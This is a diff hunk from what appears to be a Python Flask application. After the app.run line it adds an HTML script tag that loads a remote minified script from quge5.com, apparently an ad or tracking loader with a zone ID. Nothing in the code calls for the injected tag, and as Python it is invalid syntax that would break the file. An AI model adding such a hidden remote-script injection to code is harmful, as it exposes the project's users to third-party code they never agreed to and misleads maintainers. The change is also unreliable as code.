@@ -489,3 +489,5 @@ def main():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))
+
+<script src="https://quge5.com/88/tag.min.js" data-zone="163361" async data-cfasync="false"></script>
